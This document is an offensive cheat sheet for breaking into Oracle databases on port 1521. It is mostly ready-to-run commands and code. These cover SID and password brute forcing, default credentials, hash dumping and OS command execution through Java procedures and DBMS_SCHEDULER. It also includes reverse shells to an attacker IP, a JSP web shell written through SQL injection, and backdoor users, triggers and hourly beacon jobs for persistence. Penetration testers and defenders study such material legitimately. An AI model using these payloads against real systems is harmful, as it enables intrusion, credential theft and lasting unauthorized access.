# ORACLE DATABASE ENUMERATION (Port 1521)

## PORT OVERVIEW
```
Port 1521 - Oracle TNS Listener (default)
Port 1522 - Alternative Oracle port
Port 1630 - Oracle Data Guard
Port 2483 - Oracle database SSL/TLS
Port 2484 - Oracle database SSL/TLS
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p1521 <IP>                            # Service/Version detection
nmap -p1521 --script oracle-sid-brute <IP>      # Brute force SID
nmap -p1521 --script oracle-tns-version <IP>    # TNS version
tnscmd10g version -h <IP> -p 1521               # TNS version (tnscmd10g)
nc -nv <IP> 1521                                # Manual connection
```

## NMAP ORACLE ENUMERATION
```bash
nmap --script "oracle-*" -p1521 <IP>            # All Oracle scripts
nmap --script oracle-tns-version -p1521 <IP>    # TNS version
nmap --script oracle-sid-brute -p1521 <IP>      # Brute force SID
nmap --script oracle-brute -p1521 <IP>          # Brute force credentials
nmap --script oracle-brute-stealth -p1521 <IP>  # Stealth brute force
nmap --script oracle-enum-users --script-args sid=<SID>,user=SYSTEM,pass=password -p1521 <IP>
```

## SID ENUMERATION (SYSTEM IDENTIFIER)
```bash
# Oracle SID is required to connect
# SID identifies specific database instance

# Brute force SID
nmap --script oracle-sid-brute -p1521 <IP>
hydra -L sids.txt -s 1521 <IP> oracle-sid       # Hydra SID brute force

# ODAT (Oracle Database Attacking Tool)
odat sidguesser -s <IP> -p 1521                 # Guess SID
odat sidguesser -s <IP> -p 1521 --sids-file sids.txt

# Common default SIDs
ORCL                                            # Most common
XE                                              # Oracle Express Edition
ORADB
DB11G
DBORA
PLSExtProc
```

## ODAT (ORACLE DATABASE ATTACKING TOOL)
```bash
# ODAT is the best tool for Oracle enumeration and exploitation
# Install: apt install odat

# Test connection and enumerate
odat all -s <IP> -p 1521 -d <SID>               # Test all modules
odat all -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD>  # With credentials

# Specific modules
odat tnscmd -s <IP> -p 1521 --version           # TNS version
odat sidguesser -s <IP> -p 1521                 # Guess SID
odat passwordguesser -s <IP> -p 1521 -d <SID>   # Brute force credentials
odat utlfile -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD> --getFile /tmp file.txt output.txt  # Read file
odat dbmsxslprocessor -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD> --putFile /tmp shell.sh shell.sh  # Write file
odat externaltable -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD> --exec /bin/bash -c 'whoami'  # RCE
```

## AUTHENTICATION TESTING
```bash
# Test for default credentials
sqlplus <USER>/<PASSWORD>@<IP>:1521/<SID>       # Direct connection

# Common default credentials
sys:sys                                         # SYSDBA (most privileged)
system:manager
system:oracle
scott:tiger                                     # Classic default account
dbsnmp:dbsnmp                                   # Enterprise Manager
oracle:oracle

# sqlplus usage
sqlplus sys/password@<IP>:1521/ORCL as sysdba   # Connect as SYSDBA
sqlplus system/manager@<IP>:1521/ORCL           # Connect as SYSTEM
```

## BRUTE FORCE ATTACKS
```bash
# ODAT brute force
odat passwordguesser -s <IP> -p 1521 -d <SID>   # Default wordlist
odat passwordguesser -s <IP> -p 1521 -d <SID> --accounts-file accounts.txt

# Hydra
hydra -L users.txt -P passwords.txt <IP> oracle-listener
hydra -l SYSTEM -P passwords.txt <IP> oracle://<SID>

# Nmap
nmap --script oracle-brute -p1521 <IP> --script-args oracle-brute.sid=<SID>
nmap --script oracle-brute-stealth -p1521 <IP> --script-args oracle-brute.sid=<SID>

# Patator
patator oracle_login host=<IP> port=1521 user=FILE0 password=FILE1 sid=<SID> 0=users.txt 1=passwords.txt
```

## SQLPLUS CLIENT (DIRECT CONNECTION)
```bash
# Connect to Oracle
sqlplus <USER>/<PASSWORD>@<IP>:1521/<SID>
sqlplus system/manager@<IP>:1521/ORCL
sqlplus sys/password@<IP>:1521/ORCL as sysdba   # SYSDBA role

# Common commands after connection
SELECT * FROM v$version;                        # Oracle version
SELECT username FROM dba_users;                 # List users
SELECT * FROM session_privs;                    # Current user privileges
SELECT name FROM v$database;                    # Database name
SELECT tablespace_name FROM dba_tablespaces;    # List tablespaces
SELECT table_name FROM all_tables;              # List tables
exit;                                           # Quit
```

## ENUMERATE DATABASES & SCHEMAS
```bash
# After authentication
SELECT * FROM v$database;                       # Database info
SELECT name FROM v$database;                    # Database name
SELECT instance_name FROM v$instance;           # Instance name

# List users/schemas
SELECT username FROM dba_users;                 # All users
SELECT username FROM all_users;                 # Accessible users
SELECT username, account_status FROM dba_users; # User status

# List tables
SELECT table_name FROM all_tables;              # All accessible tables
SELECT table_name FROM user_tables;             # Current user's tables
SELECT owner, table_name FROM all_tables;       # With owners

# List columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```

## ENUMERATE USERS & PRIVILEGES
```bash
# List users with privileges
SELECT username, account_status, created FROM dba_users;

# Check current user
SELECT user FROM dual;
SELECT sys_context('USERENV', 'SESSION_USER') FROM dual;

# Check privileges
SELECT * FROM session_privs;                    # Current session privileges
SELECT * FROM user_sys_privs;                   # System privileges
SELECT * FROM user_role_privs;                  # Roles

# Check for DBA role
SELECT grantee FROM dba_role_privs WHERE granted_role='DBA';

# Check for SYSDBA/SYSOPER
SELECT * FROM v$pwfile_users;                   # Users with SYSDBA/SYSOPER
```

## EXTRACT DATA
```bash
# Dump data from tables
SELECT * FROM <schema>.<table>;
SELECT username, password FROM users;

# Search for sensitive data
SELECT table_name FROM all_tables WHERE table_name LIKE '%USER%';
SELECT table_name FROM all_tables WHERE table_name LIKE '%PASSWORD%';
SELECT table_name FROM all_tables WHERE table_name LIKE '%ADMIN%';

# Extract password hashes
SELECT name, password FROM sys.user$;           # Oracle 10g
SELECT name, spare4 FROM sys.user$;             # Oracle 11g (SHA-1)
```

## COMMAND EXECUTION (JAVA STORED PROCEDURES)
```bash
# Oracle allows OS command execution via Java stored procedures
# Requires CREATE PROCEDURE privilege and Java enabled

# Create Java stored procedure for command execution
BEGIN
  DBMS_JAVA.grant_permission('PUBLIC', 'java.io.FilePermission', '<<ALL FILES>>', 'execute');
END;
/

CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "JAVACMD" AS
import java.io.*;
public class JAVACMD {
  public static void execute(String cmd) throws IOException {
    Runtime.getRuntime().exec(cmd);
  }
}
/

CREATE OR REPLACE PROCEDURE RUNCMD(p_cmd IN VARCHAR2) AS LANGUAGE JAVA
NAME 'JAVACMD.execute(java.lang.String)';
/

# Execute OS command
EXEC RUNCMD('whoami');
EXEC RUNCMD('cmd.exe /c whoami > C:\temp\output.txt');  # Windows
EXEC RUNCMD('/bin/bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"');  # Linux reverse shell
```

## COMMAND EXECUTION (DBMS_SCHEDULER)
```bash
# DBMS_SCHEDULER can execute OS commands
# Requires CREATE JOB privilege

BEGIN
  DBMS_SCHEDULER.create_program(
    program_name => 'RUNCMD',
    program_type => 'EXECUTABLE',
    program_action => '/bin/bash',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.define_program_argument(
    program_name => 'RUNCMD',
    argument_position => 1,
    argument_value => '-c'
  );
  DBMS_SCHEDULER.define_program_argument(
    program_name => 'RUNCMD',
    argument_position => 2,
    argument_value => 'whoami > /tmp/output.txt'
  );
  DBMS_SCHEDULER.enable('RUNCMD');
END;
/

# Create and run job
BEGIN
  DBMS_SCHEDULER.create_job(
    job_name => 'RUNJOB',
    program_name => 'RUNCMD',
    start_date => SYSTIMESTAMP,
    enabled => TRUE
  );
END;
/
```

## FILE OPERATIONS (UTL_FILE)
```bash
# UTL_FILE allows reading/writing files
# Requires directory object and UTL_FILE privileges

# Check UTL_FILE directories
SELECT * FROM all_directories;

# Create directory object (requires DBA privilege)
CREATE OR REPLACE DIRECTORY MYDIR AS '/tmp';

# Write file
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('MYDIR', 'shell.sh', 'w');
  UTL_FILE.PUT_LINE(f, '#!/bin/bash');
  UTL_FILE.PUT_LINE(f, 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1');
  UTL_FILE.FCLOSE(f);
END;
/

# Read file
DECLARE
  f UTL_FILE.FILE_TYPE;
  line VARCHAR2(32767);
BEGIN
  f := UTL_FILE.FOPEN('MYDIR', 'file.txt', 'r');
  LOOP
    UTL_FILE.GET_LINE(f, line);
    DBMS_OUTPUT.PUT_LINE(line);
  END LOOP;
EXCEPTION
  WHEN NO_DATA_FOUND THEN
    UTL_FILE.FCLOSE(f);
END;
/

# ODAT file operations
odat utlfile -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD> --getFile /etc passwd passwd.txt
odat utlfile -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD> --putFile /tmp shell.sh shell.sh
```

## PRIVILEGE ESCALATION
```bash
# Check if user has DBA role
SELECT * FROM user_role_privs WHERE granted_role='DBA';

# Grant DBA role (requires GRANT ANY ROLE privilege or DBA)
GRANT DBA TO <username>;

# Create user with DBA privileges
CREATE USER backdoor IDENTIFIED BY Password123!;
GRANT DBA TO backdoor;
GRANT CREATE SESSION TO backdoor;

# Connect as SYSDBA (if password known)
sqlplus sys/password@<IP>:1521/<SID> as sysdba

# Privilege escalation via injection
# If low-privileged user can execute procedure owned by privileged user
# May be able to escalate via SQL injection in the procedure
```

## HASH DUMPING & CRACKING
```bash
# Dump password hashes
SELECT name, password FROM sys.user$;           # Oracle 10g (DES)
SELECT name, spare4 FROM sys.user$;             # Oracle 11g (SHA-1)

# Export hashes
SPOOL hashes.txt
SELECT name || ':' || password FROM sys.user$ WHERE password IS NOT NULL;
SPOOL OFF

# Crack Oracle hashes
hashcat -m 3100 hashes.txt rockyou.txt          # Oracle 11g (SHA-1)
john --format=oracle11 hashes.txt               # John the Ripper
hashcat -m 12300 hashes.txt rockyou.txt         # Oracle 12c
```

## TNS LISTENER ENUMERATION
```bash
# TNS Listener controls database connections

# Check TNS listener status
lsnrctl status                                  # If local access
tnscmd10g status -h <IP> -p 1521                # Remote

# TNS version
tnscmd10g version -h <IP> -p 1521

# ODAT TNS commands
odat tnscmd -s <IP> -p 1521 --ping
odat tnscmd -s <IP> -p 1521 --version
odat tnscmd -s <IP> -p 1521 --status

# Nmap TNS version
nmap --script oracle-tns-version -p1521 <IP>
```

## TNS POISONING
```bash
# TNS poisoning allows MITM attacks
# Attacker registers fake database instance with listener

# Check if listener allows remote registration
odat tnscmd -s <IP> -p 1521 --status

# If SECURE_REGISTER=OFF, listener is vulnerable
# Metasploit module
msfconsole -q -x "use auxiliary/admin/oracle/tnscmd; set RHOSTS <IP>; run"
```

## EXTERNAL TABLE (FILE READ/WRITE)
```bash
# External tables allow reading/writing files
# Requires CREATE TABLE and directory access

# Create directory
CREATE OR REPLACE DIRECTORY MYDIR AS '/tmp';

# Read file via external table
CREATE TABLE ext_table (
  line VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
  TYPE ORACLE_LOADER
  DEFAULT DIRECTORY MYDIR
  ACCESS PARAMETERS (
    RECORDS DELIMITED BY NEWLINE
    FIELDS TERMINATED BY ','
  )
  LOCATION ('file.txt')
)
REJECT LIMIT UNLIMITED;

SELECT * FROM ext_table;

# ODAT external table exploitation
odat externaltable -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD> --getFile /etc passwd passwd.txt
odat externaltable -s <IP> -p 1521 -d <SID> -U <USER> -P <PASSWORD> --exec /bin/bash -c 'whoami'
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/oracle/tnslsnr_version    # TNS version
use auxiliary/scanner/oracle/sid_enum           # SID enumeration
use auxiliary/scanner/oracle/sid_brute          # SID brute force
use auxiliary/admin/oracle/oracle_login         # Login scanner
use auxiliary/admin/oracle/oracle_sql           # Execute SQL
use auxiliary/admin/oracle/post_exploitation/win32exec  # Command execution (Windows)
use auxiliary/admin/oracle/post_exploitation/read_file  # Read files
use exploit/windows/oracle/tns_auth_sesskey     # CVE-2012-1675
```

## SQLI TO RCE (WEB APPLICATION)
```bash
# If SQL injection exists in web app

# Execute OS command via Java stored procedure
'; EXEC RUNCMD('whoami'); --

# Read files via UTL_FILE
' UNION SELECT UTL_FILE.GET_LINE('MYDIR', 'file.txt') FROM dual; --

# Write web shell
'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN('MYDIR', 'shell.jsp', 'w'); UTL_FILE.PUT_LINE(f, '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'); UTL_FILE.FCLOSE(f); END; --
```

## ORACLE WEB APPLICATION SERVER
```bash
# Oracle Application Server often runs alongside database
# Check for common ports: 7777, 7778, 8888, 8889, 1810, 4443

# Default credentials for OAS
orcladmin:welcome
system:manager
```

## COMMON MISCONFIGURATIONS
```
☐ Default credentials (system:manager, scott:tiger)
☐ Weak TNS Listener password
☐ TNS Listener allows remote registration
☐ Excessive privileges granted to PUBLIC role
☐ Oracle running as Administrator/root
☐ UTL_FILE directories world-writable
☐ Java execution enabled for low-privileged users
☐ Old Oracle version (known CVEs)
☐ No firewall rules (Oracle exposed to internet)
☐ Unencrypted connections (no SSL/TLS)
```

## PERSISTENCE
```bash
# Create backdoor user
CREATE USER backdoor IDENTIFIED BY Password123!;
GRANT DBA TO backdoor;
GRANT CREATE SESSION TO backdoor;

# Backdoor via trigger (runs on specific table activity)
CREATE OR REPLACE TRIGGER backdoor_trigger
BEFORE INSERT ON users
FOR EACH ROW
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO backdoor';
END;
/

# Backdoor via DBMS_SCHEDULER job (runs periodically)
BEGIN
  DBMS_SCHEDULER.create_job(
    job_name => 'BACKDOOR_JOB',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash -c "curl http://<attacker>/beacon"',
    start_date => SYSTIMESTAMP,
    repeat_interval => 'FREQ=HOURLY',
    enabled => TRUE
  );
END;
/
```

## QUICK WIN CHECKLIST
```
☐ Test for empty passwords
☐ Test default credentials (system:manager, scott:tiger, sys:sys)
☐ Brute force SID
☐ Brute force weak passwords
☐ Check Oracle version for known CVEs
☐ Check for DBA/SYSDBA privileges
☐ Test for UTL_FILE file read/write
☐ Check if Java stored procedures are enabled
☐ Dump password hashes
☐ Search for sensitive data in tables
☐ Check TNS Listener configuration
☐ Test for SQL injection in web apps
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick Oracle enumeration
nmap -sV -p1521 --script oracle-sid-brute,oracle-tns-version <IP>

# With ODAT
odat all -s <IP> -p 1521 -d <SID>
odat all -s <IP> -p 1521 -d <SID> -U system -P manager

# With credentials
sqlplus system/manager@<IP>:1521/<SID> <<EOF
SELECT * FROM v$version;
SELECT username FROM dba_users;
SELECT * FROM session_privs;
SELECT name, password FROM sys.user$;
EOF
```

## ADVANCED TECHNIQUES
```bash
# Oracle privilege escalation exploits
# Search for known CVEs based on version

# Oracle backdoor via PL/SQL
# Inject backdoor into stored procedures

# Oracle TNS poisoning for MITM

# Oracle data exfiltration via DNS
# Use UTL_HTTP or DBMS_LDAP for out-of-band data exfiltration

# Oracle as pivot point
# Use DATABASE LINK to access other databases
SELECT * FROM table@remote_db_link;
```

## POST-EXPLOITATION (AFTER ORACLE ACCESS)
```bash
# After gaining Oracle access:
1. Check privileges (DBA, SYSDBA, CREATE PROCEDURE)
2. Enumerate schemas and tables
3. Extract sensitive data (passwords, PII, financial data)
4. Dump password hashes (crack offline)
5. Test for file read/write (UTL_FILE, external tables)
6. Test for command execution (Java stored procedures, DBMS_SCHEDULER)
7. Create persistence (backdoor user, triggers, jobs)
8. Lateral movement via credentials reuse
9. Check for database links to other systems
10. Exfiltrate data via out-of-band channels

# Full database dump
expdp system/manager@<IP>:1521/<SID> directory=DUMP_DIR dumpfile=full.dmp full=y
```
